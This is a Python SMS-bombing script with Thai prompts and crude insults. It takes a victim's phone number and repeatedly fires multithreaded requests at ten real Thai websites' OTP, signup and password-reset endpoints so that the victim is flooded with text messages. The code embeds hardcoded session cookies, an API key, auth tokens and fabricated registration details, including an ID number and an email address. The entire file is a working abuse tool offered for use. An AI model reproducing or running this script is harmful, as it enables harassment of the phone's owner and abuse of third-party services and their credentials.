import requests
import threading
from threading import Thread
import time
import colorama
import platform
import os

banner='''
                                                        เครดิต:วชิรวิทย์ เทพ
                                                         fb. วชิรวิทย์ เทพ 
                                                               ไอควายย 
'''


def clear():# ไว้เช็ค os ที่ใช้
    so_name=platform.system()#ไว้เช็ค os
    if so_name=='Windows':
        os.system('cls')
    else:
        os.system('clear')
clear()
print(banner)

phone = input(" \033[1;96mเบอร์มีหมอยยัง: ")
clear()
print(banner)
NUM = int(input("\033[92mจำนวนหมอยขึ้นยัง : "))

headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}

def api1():
    requests.get(f"https://www.scgexpress.co.th/member/getRegister?phone={phone}")
    
def api2():
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
        "referer": "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",
        "cookie": "_gcl_au=1.1.1123274548.1637746846"
        }
    requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers=headers,data=f"phoneno={phone}&retrycount=0")
    
def api3():
    requests.post("https://gettgo.com/sessions/otp_for_sign_up", data={"mobile_number":phone})
    
def api4():
    requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
    
def api5():
    requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
    
def api6():
    requests.post("http://b226.com/x/code", data={f"phone":phone})

def api7():
    requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
    
def api8():
    requests.post("https://api.mcshop.com/cognito/me/forget-password",headers={"x-store-token": "mcshop","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","x-auth-token": "O2d1ZXN0OzkyMDIzOTU7YThmNWMyZDE4YThlOTMzOGMyOGMwYWE5ODQwNTBjY2I7Ozs7","x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3"},json={"username": phone})
    
def api9():
    requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
    
def api10():
    requests.post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})
    


for i in range(NUM):
    time.sleep(0.6)
    threading.Thread(target=api1).start()
    print("\033[95mยิงล่ะไอควาย ")
    threading.Thread(target=api2).start()
    print("\033[91mยิงล่ะไอควาย")
    threading.Thread(target=api3).start()
    print("\033[92mยิงล่ะไอควาย")
    threading.Thread(target=api4).start()
    print("\033[1;96mยิงล่ะไอควาย")
    threading.Thread(target=api5).start()
    print("\033[1;94mยิงล่ะไอควาย")
    threading.Thread(target=api6).start()
    print("\033[1;93mยิงล่ะไอควาย")
    threading.Thread(target=api7).start()
    print("\033[95mยิงล่ะไอควาย")
    threading.Thread(target=api8).start()
    print("\033[1;94mยิงล่ะไอควาย")
    threading.Thread(target=api9).start()
    print("\033[91mยิงล่ะไอควาย")
    threading.Thread(target=api10).start()
    print("\033[96mยิงล่ะไอควาย")
    